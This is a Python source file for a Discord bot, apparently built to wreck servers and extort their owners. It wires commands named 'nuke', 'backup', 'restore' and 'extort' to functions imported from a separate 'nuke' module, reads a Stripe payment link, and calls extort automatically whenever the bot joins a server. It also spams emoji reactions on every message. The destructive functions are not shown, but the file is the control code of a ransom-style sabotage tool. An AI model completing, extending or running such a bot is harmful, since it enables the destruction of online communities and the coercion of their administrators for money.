from nuke import *
import os
token, payment_link = os.getenv('token'), os.getenv('stripe_link')
intents = discord.Intents.default()
intents.members, intents.message_content = True, True
bot = commands.Bot(command_prefix='$', intents=intents)


@bot.command(name='nuke')
async def nuke_command(ctx):
    if b_nuke_on_command:
        await nuke(ctx.channel.guild)
    else:
        await ctx.send('no')


@bot.command(name='backup')
async def backup_command(ctx):
    if b_backup_on_command:
        await backup(ctx.channel.guild)
    else:
        await ctx.send('no')


@bot.command(name='restore')
async def restore_command(ctx):
    if b_restore_on_command:
        await restore(ctx.channel.guild)
    else:
        await ctx.send('no')


@bot.command(name='extort')
async def extort_command(ctx):
    if b_extort:
        await extort(ctx.channel.guild)
    else:
        await ctx.send('no')


@bot.event
async def on_message(message):
    if b_spam_reacts:
        reactions = ['😂', '🤐', '😏']
        for reaction in reactions:
            try:
                await message.add_reaction(reaction)
            except discord.errors.NotFound:
                return

    await bot.process_commands(message)  # Needed because we have code in our on_message it seems


@bot.event
async def on_guild_join(guild):
    if b_extort:
        await extort(guild)


if __name__ == '__main__':
    bot.run(token=token)
